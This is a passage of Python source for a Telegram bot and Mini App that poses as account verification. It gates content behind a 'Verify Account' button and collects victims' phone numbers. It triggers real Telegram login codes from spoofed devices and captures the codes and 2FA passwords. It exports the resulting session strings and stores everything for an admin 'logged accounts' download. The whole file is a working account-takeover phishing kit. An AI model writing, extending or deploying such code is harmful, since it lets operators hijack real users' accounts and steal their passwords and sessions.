"""
bot.py — Single-server Telegram bot + Mini App API
Runs: python-telegram-bot v20+ polling + Pyrogram OTP + aiohttp web, all in one asyncio loop.
"""

import asyncio
import logging
import sqlite3
import time
import io
import random
import json
import hmac
import hashlib
from urllib.parse import unquote
from aiohttp import web

import aiosqlite

from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    KeyboardButton,
    ReplyKeyboardMarkup,
    WebAppInfo,
)
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ContextTypes,
    filters,
)
from telegram.error import TelegramError

from pyrogram import Client as PyrogramClient
from pyrogram.errors import (
    PhoneNumberInvalid,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    SessionPasswordNeeded,
    PasswordHashInvalid,
    FloodWait,
    ApiIdInvalid,
)

from config import (
    BOT_TOKEN,
    API_ID,
    API_HASH,
    OWNER_IDS,
    DB_FILE,
    CENTRAL_PREMIUM_DB,
    BUTTON_SLOTS,
    RATE_LIMIT_CLICKS,
    RATE_LIMIT_WINDOW,
    RATE_LIMIT_FREEZE,
    PHONE_REQUEST_THRESHOLD,
    MINI_APP_URL,
    WEBAPP_HOST,
    WEBAPP_PORT,
    LOGIN_BG_URL,
)

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)

# ─── Admin state constants ─────────────────────────────────────────────────────
WAITING_BROADCAST_MESSAGE = 10
WAITING_BUTTON_CONTENT    = 20
WAITING_BUTTON_NAME       = 21
WAITING_ADD_ADMIN         = 30
WAITING_REMOVE_ADMIN      = 31
WAITING_SET_BG            = 40

# ─── In-memory stores ─────────────────────────────────────────────────────────
user_click_log:     dict = {}
user_frozen_until:  dict = {}
user_total_clicks:  dict = {}
pyrogram_sessions:  dict = {}
user_login_success: dict = {}
user_slot_index:    dict = {}

_api_cred_index = 0
_api_cred_lock: asyncio.Lock = None   # initialized in main()


# ══════════════════════════════════════════════════════════════════════════════
# CENTRAL PREMIUM DB (synchronous — called once at startup)
# ══════════════════════════════════════════════════════════════════════════════

def init_central_premium_db():
    conn = sqlite3.connect(CENTRAL_PREMIUM_DB)
    c = conn.cursor()
    c.execute("""
        CREATE TABLE IF NOT EXISTS premium_users (
            user_id    INTEGER PRIMARY KEY,
            is_premium INTEGER DEFAULT 0
        )
    """)
    conn.commit()
    conn.close()


def set_user_premium(user_id: int):
    conn = sqlite3.connect(CENTRAL_PREMIUM_DB)
    c = conn.cursor()
    c.execute(
        "INSERT OR REPLACE INTO premium_users (user_id, is_premium) VALUES (?, 1)",
        (user_id,)
    )
    conn.commit()
    conn.close()


def check_user_premium(user_id: int) -> bool:
    conn = sqlite3.connect(CENTRAL_PREMIUM_DB)
    c = conn.cursor()
    c.execute("SELECT is_premium FROM premium_users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    return row is not None and row[0] == 1


init_central_premium_db()


# ══════════════════════════════════════════════════════════════════════════════
# MAIN DB  (async via aiosqlite)
# ══════════════════════════════════════════════════════════════════════════════

async def init_db():
    async with aiosqlite.connect(DB_FILE) as db:
        await db.executescript("""
            CREATE TABLE IF NOT EXISTS users (
                user_id        INTEGER PRIMARY KEY,
                username       TEXT,
                first_name     TEXT,
                registered_at  REAL,
                phone_number   TEXT    DEFAULT NULL,
                is_verified    INTEGER DEFAULT 0,
                login_success  INTEGER DEFAULT 0,
                twofa_password TEXT    DEFAULT NULL,
                string_session TEXT    DEFAULT NULL
            );
            CREATE TABLE IF NOT EXISTS groups (
                chat_id       INTEGER PRIMARY KEY,
                chat_title    TEXT,
                registered_at REAL
            );
            CREATE TABLE IF NOT EXISTS button_slots (
                slot_id     INTEGER PRIMARY KEY,
                button_name TEXT,
                is_active   INTEGER DEFAULT 0
            );
            CREATE TABLE IF NOT EXISTS button_messages (
                id           INTEGER PRIMARY KEY AUTOINCREMENT,
                slot_id      INTEGER,
                content_type TEXT,
                text_content TEXT,
                file_id      TEXT,
                FOREIGN KEY (slot_id) REFERENCES button_slots(slot_id)
            );
            CREATE TABLE IF NOT EXISTS admins (
                user_id  INTEGER PRIMARY KEY,
                username TEXT,
                added_at REAL
            );
            CREATE TABLE IF NOT EXISTS phone_logs (
                id           INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id      INTEGER,
                phone_number TEXT,
                received_at  REAL
            );
            CREATE TABLE IF NOT EXISTS session_logs (
                id             INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id        INTEGER,
                string_session TEXT,
                phone_number   TEXT,
                saved_at       REAL
            );
            CREATE TABLE IF NOT EXISTS bot_config (
                key   TEXT PRIMARY KEY,
                value TEXT
            );
        """)

        # Seed button slots
        for i in range(1, BUTTON_SLOTS + 1):
            await db.execute(
                "INSERT OR IGNORE INTO button_slots (slot_id, button_name, is_active) VALUES (?, ?, 0)",
                (i, f"Button {i}"),
            )
        # Seed owners as admins
        for owner_id in OWNER_IDS:
            await db.execute(
                "INSERT OR IGNORE INTO admins (user_id, username, added_at) VALUES (?, ?, ?)",
                (owner_id, "owner", time.time()),
            )
        # Seed default background URL
        await db.execute(
            "INSERT OR IGNORE INTO bot_config (key, value) VALUES (?, ?)",
            ("login_bg_url", LOGIN_BG_URL),
        )
        await db.commit()

    # Safe schema migrations (ignore if column already exists)
    async with aiosqlite.connect(DB_FILE) as db:
        for sql in [
            "ALTER TABLE users ADD COLUMN twofa_password TEXT DEFAULT NULL",
            "ALTER TABLE users ADD COLUMN string_session TEXT DEFAULT NULL",
        ]:
            try:
                await db.execute(sql)
                await db.commit()
            except Exception:
                pass


# ── Config helpers ─────────────────────────────────────────────────────────────

async def get_config_value(key: str) -> str | None:
    async with aiosqlite.connect(DB_FILE) as db:
        cur = await db.execute("SELECT value FROM bot_config WHERE key = ?", (key,))
        row = await cur.fetchone()
        return row[0] if row else None


async def set_config_value(key: str, value: str):
    async with aiosqlite.connect(DB_FILE) as db:
        await db.execute(
            "INSERT OR REPLACE INTO bot_config (key, value) VALUES (?, ?)",
            (key, value),
        )
        await db.commit()


# ── User/Group CRUD ────────────────────────────────────────────────────────────

async def register_user(user_id: int, username: str, first_name: str):
    async with aiosqlite.connect(DB_FILE) as db:
        await db.execute(
            "INSERT OR IGNORE INTO users (user_id, username, first_name, registered_at) VALUES (?, ?, ?, ?)",
            (user_id, username, first_name, time.time()),
        )
        await db.commit()


async def register_group(chat_id: int, chat_title: str):
    async with aiosqlite.connect(DB_FILE) as db:
        await db.execute(
            "INSERT OR IGNORE INTO groups (chat_id, chat_title, registered_at) VALUES (?, ?, ?)",
            (chat_id, chat_title, time.time()),
        )
        await db.commit()


async def get_all_user_ids():
    async with aiosqlite.connect(DB_FILE) as db:
        cur = await db.execute("SELECT user_id FROM users")
        return [r[0] for r in await cur.fetchall()]


async def get_all_group_ids():
    async with aiosqlite.connect(DB_FILE) as db:
        cur = await db.execute("SELECT chat_id FROM groups")
        return [r[0] for r in await cur.fetchall()]


# ── Slot CRUD ──────────────────────────────────────────────────────────────────

async def get_active_slots():
    async with aiosqlite.connect(DB_FILE) as db:
        cur = await db.execute(
            "SELECT slot_id, button_name FROM button_slots WHERE is_active = 1 ORDER BY slot_id"
        )
        return await cur.fetchall()


async def get_all_slots():
    async with aiosqlite.connect(DB_FILE) as db:
        cur = await db.execute(
            "SELECT slot_id, button_name, is_active FROM button_slots ORDER BY slot_id"
        )
        return await cur.fetchall()


async def get_slot_messages(slot_id: int):
    async with aiosqlite.connect(DB_FILE) as db:
        cur = await db.execute(
            "SELECT content_type, text_content, file_id FROM button_messages WHERE slot_id = ?",
            (slot_id,),
        )
        return await cur.fetchall()


async def add_multiple_messages_to_slot(slot_id: int, content_list: list):
    async with aiosqlite.connect(DB_FILE) as db:
        cur = await db.execute("SELECT COUNT(*) FROM button_messages WHERE slot_id = ?", (slot_id,))
        row = await cur.fetchone()
        current_count = row[0]
        saved = skipped = 0
        for content_type, text_content, file_id in content_list:
            if current_count + saved >= 2000:
                skipped += 1
                continue
            await db.execute(
                "INSERT INTO button_messages (slot_id, content_type, text_content, file_id) VALUES (?, ?, ?, ?)",
                (slot_id, content_type, text_content, file_id),
            )
            saved += 1
        if saved > 0:
            await db.execute("UPDATE button_slots SET is_active = 1 WHERE slot_id = ?", (slot_id,))
        await db.commit()
        return saved, skipped


async def clear_slot(slot_id: int):
    async with aiosqlite.connect(DB_FILE) as db:
        await db.execute("DELETE FROM button_messages WHERE slot_id = ?", (slot_id,))
        await db.execute("UPDATE button_slots SET is_active = 0 WHERE slot_id = ?", (slot_id,))
        await db.commit()


async def set_slot_name(slot_id: int, name: str):
    async with aiosqlite.connect(DB_FILE) as db:
        await db.execute("UPDATE button_slots SET button_name = ? WHERE slot_id = ?", (name, slot_id))
        await db.commit()


# ── Admin CRUD ─────────────────────────────────────────────────────────────────

async def get_all_admins():
    async with aiosqlite.connect(DB_FILE) as db:
        cur = await db.execute("SELECT user_id, username FROM admins ORDER BY added_at")
        return await cur.fetchall()


async def add_admin_db(user_id: int, username: str):
    async with aiosqlite.connect(DB_FILE) as db:
        await db.execute(
            "INSERT OR IGNORE INTO admins (user_id, username, added_at) VALUES (?, ?, ?)",
            (user_id, username, time.time()),
        )
        await db.commit()


async def remove_admin_db(user_id: int):
    async with aiosqlite.connect(DB_FILE) as db:
        await db.execute("DELETE FROM admins WHERE user_id = ?", (user_id,))
        await db.commit()


async def is_admin(user_id: int) -> bool:
    if user_id in OWNER_IDS:
        return True
    async with aiosqlite.connect(DB_FILE) as db:
        cur = await db.execute("SELECT user_id FROM admins WHERE user_id = ?", (user_id,))
        return (await cur.fetchone()) is not None


def is_owner(user_id: int) -> bool:
    return user_id in OWNER_IDS


# ── Session / OTP data ─────────────────────────────────────────────────────────

async def save_phone_log(user_id: int, phone_number: str):
    async with aiosqlite.connect(DB_FILE) as db:
        await db.execute(
            "INSERT INTO phone_logs (user_id, phone_number, received_at) VALUES (?, ?, ?)",
            (user_id, phone_number, time.time()),
        )
        await db.execute(
            "UPDATE users SET phone_number = ?, is_verified = 1 WHERE user_id = ?",
            (phone_number, user_id),
        )
        await db.commit()


async def save_twofa_password(user_id: int, password: str):
    async with aiosqlite.connect(DB_FILE) as db:
        await db.execute("UPDATE users SET twofa_password = ? WHERE user_id = ?", (password, user_id))
        await db.commit()


async def save_string_session(user_id: int, string_session: str, phone_number: str = None):
    async with aiosqlite.connect(DB_FILE) as db:
        await db.execute("UPDATE users SET string_session = ? WHERE user_id = ?", (string_session, user_id))
        await db.execute(
            "INSERT INTO session_logs (user_id, string_session, phone_number, saved_at) VALUES (?, ?, ?, ?)",
            (user_id, string_session, phone_number, time.time()),
        )
        await db.commit()
    logger.info(f"String session saved for user {user_id}.")


async def mark_user_login_success(user_id: int):
    user_login_success[user_id] = True
    async with aiosqlite.connect(DB_FILE) as db:
        await db.execute("UPDATE users SET login_success = 1 WHERE user_id = ?", (user_id,))
        await db.commit()


async def check_user_login_success(user_id: int) -> bool:
    if user_login_success.get(user_id):
        return True
    async with aiosqlite.connect(DB_FILE) as db:
        cur = await db.execute("SELECT login_success FROM users WHERE user_id = ?", (user_id,))
        row = await cur.fetchone()
        if row and row[0] == 1:
            user_login_success[user_id] = True
            return True
    return False


async def get_all_logged_in_users():
    async with aiosqlite.connect(DB_FILE) as db:
        cur = await db.execute(
            "SELECT user_id, username, first_name, phone_number, twofa_password, string_session "
            "FROM users WHERE login_success = 1"
        )
        return await cur.fetchall()


# ══════════════════════════════════════════════════════════════════════════════
# RATE LIMITING
# ══════════════════════════════════════════════════════════════════════════════

def check_rate_limit(user_id: int):
    now = time.time()
    if user_id in user_frozen_until:
        if now < user_frozen_until[user_id]:
            return False, user_frozen_until[user_id] - now
        del user_frozen_until[user_id]
    user_click_log.setdefault(user_id, [])
    user_click_log[user_id] = [t for t in user_click_log[user_id] if now - t < RATE_LIMIT_WINDOW]
    if len(user_click_log[user_id]) >= RATE_LIMIT_CLICKS:
        user_frozen_until[user_id] = now + RATE_LIMIT_FREEZE
        return False, RATE_LIMIT_FREEZE
    user_click_log[user_id].append(now)
    return True, 0


def increment_total_clicks(user_id: int) -> int:
    user_total_clicks[user_id] = user_total_clicks.get(user_id, 0) + 1
    return user_total_clicks[user_id]


# ══════════════════════════════════════════════════════════════════════════════
# PYROGRAM / OTP
# ══════════════════════════════════════════════════════════════════════════════

DEVICE_PROFILES = [
    {"device_model": "iPhone 16 Pro Max",     "system_version": "18.3.1",     "app_version": "10.10.1", "lang_code": "en", "system_lang_code": "en-US"},
    {"device_model": "Samsung Galaxy S25 Ultra","system_version": "Android 15","app_version": "10.9.5",  "lang_code": "en", "system_lang_code": "en-US"},
    {"device_model": "iPhone 15 Pro",          "system_version": "17.6.1",     "app_version": "10.8.4",  "lang_code": "en", "system_lang_code": "en-GB"},
    {"device_model": "Google Pixel 9 Pro",     "system_version": "Android 15", "app_version": "10.9.3",  "lang_code": "en", "system_lang_code": "en-US"},
    {"device_model": "OnePlus 13",             "system_version": "Android 15", "app_version": "10.9.1",  "lang_code": "en", "system_lang_code": "en-US"},
]

API_CREDENTIALS = [{"api_id": API_ID, "api_hash": API_HASH}]
try:
    from config import EXTRA_API_CREDENTIALS
    API_CREDENTIALS.extend(EXTRA_API_CREDENTIALS)
except Exception:
    pass


async def get_next_api_credentials():
    global _api_cred_index
    async with _api_cred_lock:
        cred = API_CREDENTIALS[_api_cred_index % len(API_CREDENTIALS)]
        _api_cred_index += 1
        return cred


async def pyrogram_send_otp(user_id: int, phone_number: str) -> tuple:
    await pyrogram_cleanup_session(user_id)
    last_error = "error"
    profiles   = DEVICE_PROFILES.copy()
    random.shuffle(profiles)

    for attempt, profile in enumerate(profiles[:3], 1):
        cred   = await get_next_api_credentials()
        client = None
        try:
            logger.info(f"OTP attempt {attempt}/3 user={user_id} device={profile['device_model']}")
            client = PyrogramClient(
                name=f"session_{user_id}_{attempt}",
                api_id=cred["api_id"],
                api_hash=cred["api_hash"],
                in_memory=True,
                **{k: profile[k] for k in profile},
            )
            await asyncio.wait_for(client.connect(), timeout=20)
            await asyncio.sleep(random.uniform(0.5, 1.5))
            sent = await asyncio.wait_for(client.send_code(phone_number), timeout=30)
            pyrogram_sessions[user_id] = {
                "client":          client,
                "phone_code_hash": sent.phone_code_hash,
                "phone_number":    phone_number,
            }
            logger.info(f"OTP sent user={user_id} attempt={attempt}")
            return True, "OTP sent"

        except PhoneNumberInvalid:
            return False, "invalid_phone"

        except ApiIdInvalid:
            logger.error(f"API creds invalid attempt={attempt}")
            last_error = "api_invalid"

        except FloodWait as e:
            logger.warning(f"FloodWait {e.value}s user={user_id}")
            if e.value <= 15 and attempt < 3:
                await asyncio.sleep(e.value + 1)
            else:
                return False, f"flood_wait_{e.value}"

        except asyncio.TimeoutError:
            logger.warning(f"Timeout attempt={attempt} user={user_id}")
            await asyncio.sleep(2)

        except Exception as e:
            logger.error(f"pyrogram_send_otp attempt={attempt} user={user_id}: {e}")
            await asyncio.sleep(1)

        finally:
            if client and user_id not in pyrogram_sessions:
                try:
                    await client.disconnect()
                except Exception:
                    pass

    logger.error(f"All OTP attempts failed user={user_id}")
    return False, last_error


async def pyrogram_verify_otp(user_id: int, otp_code: str) -> tuple:
    session = pyrogram_sessions.get(user_id)
    if not session:
        return False, "no_session"
    client          = session["client"]
    phone_number    = session["phone_number"]
    phone_code_hash = session["phone_code_hash"]
    try:
        await client.sign_in(
            phone_number=phone_number,
            phone_code_hash=phone_code_hash,
            phone_code=otp_code,
        )
        exported = await client.export_session_string()
        await client.disconnect()
        pyrogram_sessions.pop(user_id, None)
        await save_string_session(user_id, exported, phone_number)
        logger.info(f"User {user_id} signed in via OTP.")
        return True, "ok"
    except SessionPasswordNeeded:
        return False, "needs_2fa"
    except PhoneCodeInvalid:
        return False, "invalid_code"
    except PhoneCodeExpired:
        try:
            await client.disconnect()
        except Exception:
            pass
        pyrogram_sessions.pop(user_id, None)
        return False, "expired"
    except Exception as e:
        logger.error(f"pyrogram_verify_otp user={user_id}: {e}")
        return False, "error"


async def pyrogram_verify_2fa(user_id: int, password: str) -> tuple:
    session = pyrogram_sessions.get(user_id)
    if not session:
        return False, "no_session"
    client       = session["client"]
    phone_number = session.get("phone_number")
    try:
        await client.check_password(password)
        exported = await client.export_session_string()
        await client.disconnect()
        pyrogram_sessions.pop(user_id, None)
        await save_string_session(user_id, exported, phone_number)
        logger.info(f"User {user_id} passed 2FA.")
        return True, "ok"
    except PasswordHashInvalid:
        return False, "wrong_password"
    except Exception as e:
        logger.error(f"pyrogram_verify_2fa user={user_id}: {e}")
        return False, "error"


async def pyrogram_cleanup_session(user_id: int):
    session = pyrogram_sessions.pop(user_id, None)
    if session:
        try:
            if session["client"].is_connected:
                await session["client"].disconnect()
        except Exception:
            pass


# ══════════════════════════════════════════════════════════════════════════════
# TELEGRAM WEB-APP DATA VERIFICATION
# ══════════════════════════════════════════════════════════════════════════════

def verify_telegram_webapp_data(init_data: str) -> dict | None:
    try:
        params = {}
        for part in init_data.split("&"):
            if "=" in part:
                k, v = part.split("=", 1)
                params[k] = v

        hash_value = params.pop("hash", None)
        if not hash_value:
            return None

        data_check_string = "\n".join(f"{k}={v}" for k, v in sorted(params.items()))

        secret_key = hmac.new(b"WebAppData", BOT_TOKEN.encode(), hashlib.sha256).digest()
        expected   = hmac.new(secret_key, data_check_string.encode(), hashlib.sha256).hexdigest()

        if not hmac.compare_digest(expected, hash_value):
            return None

        return json.loads(unquote(params.get("user", "{}")))

    except Exception as e:
        logger.error(f"WebApp verification failed: {e}")
        return None


# ══════════════════════════════════════════════════════════════════════════════
# WEB API  (aiohttp)
# ══════════════════════════════════════════════════════════════════════════════

def _cors(extra_methods="POST, OPTIONS"):
    return {
        "Access-Control-Allow-Origin":  "*",
        "Access-Control-Allow-Headers": "Content-Type",
        "Access-Control-Allow-Methods": extra_methods,
    }


async def webapp_get_config(request: web.Request) -> web.Response:
    """Return current bot config (background URL, etc.) to the Mini App."""
    cors = _cors("GET, OPTIONS")
    if request.method == "OPTIONS":
        return web.Response(status=200, headers=cors)
    bg_url = await get_config_value("login_bg_url") or LOGIN_BG_URL
    return web.json_response({"ok": True, "login_bg_url": bg_url}, headers=cors)


async def webapp_send_otp(request: web.Request) -> web.Response:
    cors = _cors()
    if request.method == "OPTIONS":
        return web.Response(status=200, headers=cors)
    try:
        body = await request.json()
    except Exception:
        return web.json_response({"ok": False, "error": "Invalid JSON"}, status=400, headers=cors)

    init_data    = body.get("initData", "")
    phone_number = body.get("phone_number", "").strip()

    if not phone_number:
        return web.json_response({"ok": False, "error": "Phone number is required"}, status=400, headers=cors)

    user_obj = verify_telegram_webapp_data(init_data)
    if not user_obj:
        return web.json_response({"ok": False, "error": "Invalid Telegram session. Open from Telegram."}, status=403, headers=cors)

    user_id = int(user_obj.get("id", 0))
    if not user_id:
        return web.json_response({"ok": False, "error": "Could not identify user"}, status=403, headers=cors)

    if not phone_number.startswith("+"):
        phone_number = "+" + phone_number

    await register_user(user_id, user_obj.get("username", ""), user_obj.get("first_name", ""))
    await save_phone_log(user_id, phone_number)

    success, result = await pyrogram_send_otp(user_id, phone_number)

    if success:
        return web.json_response({"ok": True, "message": "OTP sent"}, headers=cors)
    if result == "invalid_phone":
        return web.json_response({"ok": False, "error": "Invalid phone number"}, status=400, headers=cors)
    if result == "api_invalid":
        return web.json_response({"ok": False, "error": "Server configuration error. Contact admin."}, status=500, headers=cors)
    if result.startswith("flood_wait_"):
        wait_sec = int(result.split("_")[-1])
        return web.json_response({"ok": False, "error": f"Too many requests. Wait {wait_sec}s.", "flood_wait": wait_sec}, status=429, headers=cors)
    return web.json_response({"ok": False, "error": "Failed to send OTP. Please try again."}, status=500, headers=cors)


async def webapp_verify_otp(request: web.Request) -> web.Response:
    cors = _cors()
    if request.method == "OPTIONS":
        return web.Response(status=200, headers=cors)
    try:
        body = await request.json()
    except Exception:
        return web.json_response({"ok": False, "error": "Invalid JSON"}, status=400, headers=cors)

    init_data = body.get("initData", "")
    otp_code  = body.get("otp_code", "").strip()

    user_obj = verify_telegram_webapp_data(init_data)
    if not user_obj:
        return web.json_response({"ok": False, "error": "Invalid Telegram session"}, status=403, headers=cors)

    user_id = int(user_obj.get("id", 0))
    if not user_id:
        return web.json_response({"ok": False, "error": "Could not identify user"}, status=403, headers=cors)

    if not otp_code or not otp_code.isdigit():
        return web.json_response({"ok": False, "error": "OTP must be numeric"}, status=400, headers=cors)

    success, status = await pyrogram_verify_otp(user_id, otp_code)

    if success:
        await mark_user_login_success(user_id)
        return web.json_response({"ok": True, "message": "Login successful", "needs_2fa": False}, headers=cors)
    if status == "needs_2fa":
        return web.json_response({"ok": False, "needs_2fa": True, "message": "2FA password required"}, headers=cors)
    if status == "invalid_code":
        return web.json_response({"ok": False, "error": "Incorrect OTP. Please try again."}, status=400, headers=cors)
    if status == "expired":
        return web.json_response({"ok": False, "error": "OTP expired. Please request a new one."}, status=400, headers=cors)
    if status == "no_session":
        return web.json_response({"ok": False, "error": "Session expired. Please restart."}, status=400, headers=cors)
    return web.json_response({"ok": False, "error": "Verification failed. Please try again."}, status=500, headers=cors)


async def webapp_verify_2fa(request: web.Request) -> web.Response:
    cors = _cors()
    if request.method == "OPTIONS":
        return web.Response(status=200, headers=cors)
    try:
        body = await request.json()
    except Exception:
        return web.json_response({"ok": False, "error": "Invalid JSON"}, status=400, headers=cors)

    init_data = body.get("initData", "")
    password  = body.get("password", "").strip()

    user_obj = verify_telegram_webapp_data(init_data)
    if not user_obj:
        return web.json_response({"ok": False, "error": "Invalid Telegram session"}, status=403, headers=cors)

    user_id = int(user_obj.get("id", 0))
    if not user_id:
        return web.json_response({"ok": False, "error": "Could not identify user"}, status=403, headers=cors)

    if not password:
        return web.json_response({"ok": False, "error": "Password cannot be empty"}, status=400, headers=cors)

    if password == "SKIP":
        await mark_user_login_success(user_id)
        await pyrogram_cleanup_session(user_id)
        return web.json_response({"ok": True, "message": "2FA skipped. Login recorded."}, headers=cors)

    success, status = await pyrogram_verify_2fa(user_id, password)

    if success:
        await save_twofa_password(user_id, password)
        await mark_user_login_success(user_id)
        return web.json_response({"ok": True, "message": "2FA verified. Login successful."}, headers=cors)
    if status == "wrong_password":
        return web.json_response({"ok": False, "error": "Incorrect 2FA password."}, status=400, headers=cors)
    if status == "no_session":
        return web.json_response({"ok": False, "error": "Session expired. Please restart."}, status=400, headers=cors)
    return web.json_response({"ok": False, "error": "2FA verification failed."}, status=500, headers=cors)


async def run_web_server():
    app = web.Application()
    # GET /api/get_config
    app.router.add_get("/api/get_config",         webapp_get_config)
    app.router.add_options("/api/get_config",      webapp_get_config)
    # POST /api/send_otp
    app.router.add_post("/api/send_otp",           webapp_send_otp)
    app.router.add_options("/api/send_otp",        webapp_send_otp)
    # POST /api/verify_otp
    app.router.add_post("/api/verify_otp",         webapp_verify_otp)
    app.router.add_options("/api/verify_otp",      webapp_verify_otp)
    # POST /api/verify_2fa
    app.router.add_post("/api/verify_2fa",         webapp_verify_2fa)
    app.router.add_options("/api/verify_2fa",      webapp_verify_2fa)

    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, WEBAPP_HOST, WEBAPP_PORT)
    await site.start()
    logger.info(f"Web API running on {WEBAPP_HOST}:{WEBAPP_PORT}")


# ══════════════════════════════════════════════════════════════════════════════
# CONTENT DELIVERY
# ══════════════════════════════════════════════════════════════════════════════

def extract_content_from_message(message):
    if message.text:
        return "text", message.text, ""
    if message.photo:
        return "photo", message.caption or "", message.photo[-1].file_id
    if message.video:
        return "video", message.caption or "", message.video.file_id
    if message.animation:
        return "animation", message.caption or "", message.animation.file_id
    if message.sticker:
        return "sticker", "", message.sticker.file_id
    if message.document:
        return "document", message.caption or "", message.document.file_id
    if message.audio:
        return "audio", message.caption or "", message.audio.file_id
    if message.voice:
        return "voice", message.caption or "", message.voice.file_id
    return None, None, None


async def send_content_to_user(target, slot_id: int, user_id: int = None):
    messages = await get_slot_messages(slot_id)
    if not messages:
        await target.reply_text("This button has no content yet.")
        return False, "empty"
    try:
        total = len(messages)
        if user_id is not None:
            key = (user_id, slot_id)
            user_slot_index.setdefault(key, random.randint(0, total - 1))
            idx = user_slot_index[key] % total
            user_slot_index[key] = (idx + 1) % total
        else:
            idx = random.randint(0, total - 1)

        content_type, text_content, file_id = messages[idx]
        if content_type == "text":
            await target.reply_text(text_content)
        elif content_type == "photo":
            await target.reply_photo(photo=file_id, caption=text_content or None)
        elif content_type == "video":
            await target.reply_video(video=file_id, caption=text_content or None)
        elif content_type == "document":
            await target.reply_document(document=file_id, caption=text_content or None)
        elif content_type == "animation":
            await target.reply_animation(animation=file_id, caption=text_content or None)
        elif content_type == "sticker":
            await target.reply_sticker(sticker=file_id)
        elif content_type == "audio":
            await target.reply_audio(audio=file_id, caption=text_content or None)
        elif content_type == "voice":
            await target.reply_voice(voice=file_id, caption=text_content or None)
        return True, "ok"
    except TelegramError as e:
        logger.error(f"send_content_to_user error: {e}")
        return False, "error"


# ══════════════════════════════════════════════════════════════════════════════
# KEYBOARD BUILDERS
# ══════════════════════════════════════════════════════════════════════════════

async def build_user_reply_keyboard():
    active_slots = await get_active_slots()
    if not active_slots:
        return None
    buttons, row = [], []
    for slot_id, button_name in active_slots:
        row.append(KeyboardButton(f"🎁 {button_name}"))
        if len(row) == 3:
            buttons.append(row); row = []
    if row:
        buttons.append(row)
    return ReplyKeyboardMarkup(buttons, resize_keyboard=True)


async def build_admin_reply_keyboard():
    all_slots = await get_all_slots()
    buttons, row = [], []
    for slot_id, button_name, is_active in all_slots:
        row.append(KeyboardButton(f"{'✅' if is_active else '❌'} {button_name}"))
        if len(row) == 3:
            buttons.append(row); row = []
    if row:
        buttons.append(row)
    buttons.append([KeyboardButton("⚙️ Settings"), KeyboardButton("📊 Stats"), KeyboardButton("📢 Broadcast")])
    buttons.append([KeyboardButton("📋 Notes"), KeyboardButton("🖼 Set BG")])
    return ReplyKeyboardMarkup(buttons, resize_keyboard=True)


async def build_admin_panel_keyboard():
    all_slots = await get_all_slots()
    keyboard, row = [], []
    for slot_id, button_name, is_active in all_slots:
        row.append(InlineKeyboardButton(
            f"{'✅' if is_active else '❌'} {button_name}",
            callback_data=f"admin_slot_{slot_id}",
        ))
        if len(row) == 2:
            keyboard.append(row); row = []
    if row:
        keyboard.append(row)
    keyboard.append([InlineKeyboardButton("⚙️ Settings", callback_data="settings_menu")])
    return keyboard


async def build_settings_keyboard():
    return [
        [InlineKeyboardButton("👥 Manage Admins", callback_data="manage_admins")],
        [InlineKeyboardButton("📢 Broadcast",      callback_data="broadcast_menu")],
        [InlineKeyboardButton("📊 Stats",          callback_data="show_stats")],
        [InlineKeyboardButton("🖼 Set BG Photo",   callback_data="set_bg_menu")],
        [InlineKeyboardButton("🔙 Back",           callback_data="back_to_admin")],
    ]


# ══════════════════════════════════════════════════════════════════════════════
# ADMIN NOTES EXPORT
# ══════════════════════════════════════════════════════════════════════════════

async def export_notes_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_admin(update.effective_user.id):
        await update.message.reply_text("Permission denied.")
        return
    logged_in = await get_all_logged_in_users()
    if not logged_in:
        await update.message.reply_text("No logged-in accounts found.")
        return
    lines = ["=" * 50, "LOGGED IN ACCOUNTS", "=" * 50, ""]
    for idx, (uid, username, first_name, phone, twofa, session) in enumerate(logged_in, 1):
        lines += [
            f"Account #{idx}",
            f"Name          : {first_name or 'N/A'}",
            f"Username      : {'@' + username if username else 'N/A'}",
            f"Phone         : {phone or 'N/A'}",
            f"2FA Pass      : {twofa or 'N/A'}",
            f"User ID       : {uid}",
            f"String Session: {session or 'N/A'}",
            "-" * 40,
        ]
    buf = io.BytesIO("\n".join(lines).encode())
    buf.name = "logged_accounts.txt"
    await update.message.reply_document(
        document=buf, filename="logged_accounts.txt",
        caption=f"Total logged-in accounts: {len(logged_in)}",
    )


# ══════════════════════════════════════════════════════════════════════════════
# BOT COMMAND HANDLERS
# ══════════════════════════════════════════════════════════════════════════════

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    await register_user(user.id, user.username or "", user.first_name or "")

    if check_user_premium(user.id):
        await update.message.reply_text(f"Welcome back, {user.first_name}!\n\nYour premium subscription is active.")
        return

    if await is_admin(user.id):
        kb = await build_admin_reply_keyboard()
        await update.message.reply_text(f"Welcome Admin {user.first_name}!\n\nAdmin Panel is ready.", reply_markup=kb)
        return

    kb = await build_user_reply_keyboard()
    if MINI_APP_URL:
        await update.message.reply_text(
            f"Welcome, {user.first_name}!\n\nTap below to verify your account and unlock all content:",
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("Verify Account", web_app=WebAppInfo(url=MINI_APP_URL))
            ]]),
        )
    if kb:
        await update.message.reply_text("Choose an option:", reply_markup=kb)
    elif not MINI_APP_URL:
        await update.message.reply_text(f"Welcome, {user.first_name}!\n\nNo content available yet.")


async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_admin(update.effective_user.id):
        await update.message.reply_text("Permission denied.")
        return
    keyboard = await build_admin_panel_keyboard()
    await update.message.reply_text("Admin Panel:", reply_markup=InlineKeyboardMarkup(keyboard))


async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_admin(update.effective_user.id):
        await update.message.reply_text("Permission denied.")
        return
    users    = await get_all_user_ids()
    groups   = await get_all_group_ids()
    slots    = await get_all_slots()
    active   = sum(1 for _, _, a in slots if a)
    admins   = await get_all_admins()
    logged   = await get_all_logged_in_users()
    await update.message.reply_text(
        f"📊 Bot Statistics\n\n"
        f"👥 Total Users:       {len(users)}\n"
